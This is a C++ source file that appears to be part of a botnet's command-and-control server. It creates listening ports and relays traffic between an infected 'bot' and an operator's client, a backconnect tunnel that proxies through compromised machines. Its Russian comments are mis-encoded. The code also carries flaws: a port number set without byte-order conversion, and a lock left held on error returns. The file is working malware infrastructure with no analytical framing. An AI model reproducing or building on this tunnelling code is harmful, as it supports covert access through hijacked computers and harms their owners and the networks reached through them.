#include "stdafx.h"
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "Listener.h"
#include "../common/protocol.h"


struct TUNNEL_INFO
{
	SOCKET bot;
	SOCKET client;
};

static int lastOpenPort = 10000; //ѕоследний открытый порт

int CreatePort(SOCKET& sc)
{
	sockaddr_in sa;
	int ret = 0;
	while(ret == 0)
	{
		sc = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		if( sc != INVALID_SOCKET )
		{
			ret = lastOpenPort;
			sa.sin_family = AF_INET;
			sa.sin_addr.s_addr = INADDR_ANY;
			while( ret < 20000 )
			{
				ret++;
				sa.sin_port = ret;
				int sz = sizeof(sa);
				if( !bind( sc, (sockaddr*)&sa, sz ) && !getsockname( sc, (sockaddr*)&sa, &sz ) && !listen( sc, 100 ) )
				{
			       ret = htons(sa.sin_port);
				   lastOpenPort = ret;
				   break;
				}
			}
		}
	}
	if( ret == 0 )
		closesocket(sc);
	return ret;
}

void WINAPI StartPortForw(TUNNEL_INFO *tunnelInfo)
{
	int wait = 5;
	while( true )
	{
		sockaddr_in sa1;
		int sz_sa = sizeof(sa1);
		SOCKET s1 = accept( tunnelInfo->bot, (sockaddr*)&sa1, &sz_sa ); //ждем когда соединитс€ бот
		if( s1 != INVALID_SOCKET )
		{
			while(true)
			{
				sockaddr_in sa2;
				int sz_sa = sizeof(sa2);
				SOCKET s2 = accept( tunnelInfo->client, (sockaddr*)&sa2, &sz_sa ); //ждем когда подключатьс€ к клиенту
				if( s2 != INVALID_SOCKET )
				{
				    while (true)
					{
						fd_set fdsr;
						fdsr.fd_count=2;
						fdsr.fd_array[0]=s1;
						fdsr.fd_array[1]=s2;

						if (select(0,&fdsr,NULL,NULL,NULL) < 1)
						break;

						for (u_int i=0; i < fdsr.fd_count; i++)
						{
							char buf[1024];
							int dw;
							SOCKET hRead=fdsr.fd_array[i],
							hWrite=((hRead == s1) ? s2 : s1);
							if (((dw=recv(hRead,buf,sizeof(buf), 0)) < 1) || (send(hWrite,buf,dw, 0) != dw))
								goto end;
						}
					}
					end:
					closesocket(s2);
				}
				else
				{
					Sleep(1000);
					if( wait-- == 0 ) break;
				}
			}
		}
		else
		{
			Sleep(1000);
			if( wait-- == 0 ) 	break;
		}
	}
	closesocket(tunnelInfo->bot);
	closesocket(tunnelInfo->client);
	free(tunnelInfo);
}


int CClient::RequestPortForw( int port )
{
	m_TransactionLock.Lock();

	list<Transaction>::iterator I = FindTransactionToSend( PK_SC_PORTFORW );
	PORT_FORW  pf;
	SOCKET bot, client;
	int portBot, portClient;

	portBot = CreatePort(bot);
	if( portBot == 0 ) return 0;
	portClient = CreatePort(client);
	if( portClient == 0 )
	{
		closesocket(bot);
		return 0;
	}

	pf.portForw = port;
	pf.portConnect = portBot;

	I->Reset();
	I->m_Sent.Create( PK_SC_PORTFORW, timeGetTime(), sizeof(PORT_FORW), &pf );

	TUNNEL_INFO* tunnelInfo = (TUNNEL_INFO*) malloc(sizeof(TUNNEL_INFO));
	tunnelInfo->bot = bot;
	tunnelInfo->client = client;
	CloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartPortForw,(LPVOID)tunnelInfo,0,NULL));

	m_TransactionLock.Unlock();
	return portClient;
}
